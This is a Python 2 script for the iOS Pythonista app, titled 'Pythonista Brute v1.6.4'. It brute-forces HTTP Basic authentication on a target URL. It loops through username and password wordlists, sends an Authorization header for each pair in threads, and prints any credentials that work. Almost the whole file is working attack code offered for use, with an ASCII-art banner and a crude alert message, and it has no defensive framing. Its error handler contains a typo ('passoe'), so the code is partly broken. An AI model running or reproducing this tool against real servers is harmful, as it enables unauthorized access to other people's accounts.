import sys
import re
import urllib2
import httplib
import socket
import HTMLParser
import socket
import base64
import os
import time
from sys import stdout
from threading import Thread
from time import sleep
import console
console.set_color()
# patorjk.com for logo maker
console.set_color(130, 130, 0)
print "      (                    "
print "   (  )\ )       '    )    "
print " ( )\(()/(   ( ` )  /((    "
console.set_color(255, 0, 0)
print " )((_)/(_))  )\ ( )(_))\   "
print "((_)_(_)) _ ((_|_(_()|(_)) "
console.set_color()
print " | _ ) _ \ | | |_   _| __| "
print " | _ \   / |_| | | | | _|  "
print " |___/_|_\\_____/ |_| |___|"
print ""
time.sleep(1)
def usage():
	console.set_color(255, 0, 0)
	print "\n-+- Usage -+-"
	console.set_color()
	print "sys.argv[1] = Target Url"
	print "sys.argv[2] = Useranme List"
	print "sys.argv[3] = Password List"
	print ""
	console.set_color(255, 0, 0)
	print "-+- Example of Argv -+-"
	console.set_color()
	print "http://google.com name.txt pass.txt"
	print ""
	console.set_color(255, 0, 0)
	print "-+- Credits -+-"
	console.set_color()
	print "[+] Pythonista Version:"
	print " -  Russian_Otter"
	print ""
	print "[+] Original Version:"
	print " -  phteam"
	return
console.alert("Pythonista Brute v1.6.4", "Disclaimer:\nThe Target Server must be a server that wants connection authenication. Regular website login pages do not work with this version.\nClick the booty to continue.", "(  Y  )")
def basic_auth(host, username, passwd):
	try:
		request = urllib2.Request(host)
		base64string = base64.encodestring('%s:%s' % (username, passwd))[:-1]
		request.add_header("Authorization", "Basic %s" % base64string)
		result = urllib2.urlopen(request)
		stdout.write('[+]')
		print 'Forcing:\n[USER]: %s\n[PASS]: %s\n' %(username, passwd)
	except: passoe
def scan(host, usernames, passwords):
	try:
		for username in usernames:
			for pwd in passwords:
				t = Thread(target=basic_auth, args=(host,username,pwd,))
				t.start()
				t.join()
				stdout.write('')
				stdout.flush()
				while(t.isAlive()):
					time.sleep(0x8)
	except (KeyboardInterrupt, SystemExit):
		raise
def main():
	if len(sys.argv) == 4:
		m_host  = str(sys.argv[1])
		userfile = sys.argv[2]
		passfile = sys.argv[-1]
		console.set_color(255, 255, 0)
		print "-+--=:=- Brute Force Client 1.6.4"
		console.set_color(255, 0, 0)
		print "[root]: Starting Agent"
		print "[root]: Brute Force"
		print "Target: %s"% (m_host)
		console.set_color()
		uwords = open(sys.argv[2], "r").readlines()
		pwords = open(sys.argv[3], "r").readlines()
		console.set_color(255, 255, 0)
		print "[Usernames] Loaded:",len(uwords)
		print "[Passwords] Loaded:",len(pwords)
		print ""
		console.set_color()
		time.sleep(4)
		usernames = []
		passwords = []
		results = None
		if not os.path.isfile(userfile):
			print 'user file not found in \'%s\' on current directory' %(userfile)
			exit()
		if not os.path.isfile(passfile):
			print 'pass file not found in \'%s\' on current directory' %(userfile)
			exit()
		try:
			with open(userfile, 'r') as f: 
				for line in f:
					line = line.strip()
					usernames.append(line)
		except IOError:
			print 'Error reading users.txt, Please check file if readable/corrupt.'
			exit()
		try:
			with open(passfile, 'r') as f:
				for line in f:
					line = line.strip()
					passwords.append(line)
		except IOError: 
			print 'Error reading pass.txt, Please check file if readable/corrupt.'
			exit()
		if len(usernames) == 0:
			print 'No content(s). Please check users.txt file'
			exit()
		if len(passwords) == 0:
			print 'No content(s). Please check pass.txt file'
			exit()
		thread = Thread(target=scan, args=(m_host,usernames,passwords,))
		thread.start()
		thread.join()
		while(thread.isAlive()):
			sleep(0x8)
		stdout.write('')
		console.set_color(255, 255, 0)
		print '\n-+--=:=- Ended Brute Force\n\n'
		console.set_color()
	else:
		usage()
if __name__ == '__main__':
  main()
